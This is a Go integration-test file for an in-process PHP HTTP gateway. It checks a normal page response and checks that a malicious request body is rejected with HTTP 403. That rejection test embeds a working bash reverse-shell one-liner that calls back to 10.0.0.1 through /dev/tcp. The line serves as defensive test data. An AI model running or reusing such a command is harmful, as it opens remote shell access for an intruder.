// SPDX-License-Identifier: Apache-2.0 OR MIT
// php127/httpgateway: Tests d'intégration du serveur HTTP in-process

package httpgateway

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"code.hazyhaar.fr/devhoros/php127/security"
)

func TestGatewayNominalRequest(t *testing.T) {
	src := `
	echo "<html><body><h1>Hello from PHP 127</h1></body></html>";
	`
	gw, err := CompileAndServe(src, security.ModeEnforce)
	if err != nil {
		t.Fatalf("Erreur compilation gateway: %v", err)
	}

	req := httptest.NewRequest("GET", "/index.php?user=alice", nil)
	rec := httptest.NewRecorder()

	gw.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("Code HTTP attendu 200, reçu %d", rec.Code)
	}

	body := rec.Body.String()
	if !strings.Contains(body, "Hello from PHP 127") {
		t.Fatalf("Corps de réponse inattendu: %s", body)
	}

	if rec.Header().Get("X-Powered-By") != "php127/flatstack-go" {
		t.Fatalf("En-tête X-Powered-By manquant")
	}
}

func TestGatewayMaliciousPayloadBlocked(t *testing.T) {
	src := `
	echo "Nominal page";
	`
	gw, err := CompileAndServe(src, security.ModeEnforce)
	if err != nil {
		t.Fatalf("Erreur compilation: %v", err)
	}

	// Payload with suspicious reverse shell command in body
	maliciousBody := strings.NewReader("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
	req := httptest.NewRequest("POST", "/api/upload", maliciousBody)
	rec := httptest.NewRecorder()

	gw.ServeHTTP(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Fatalf("Charge utile malveillante attendue bloquée 403, obtenu: %d", rec.Code)
	}
}
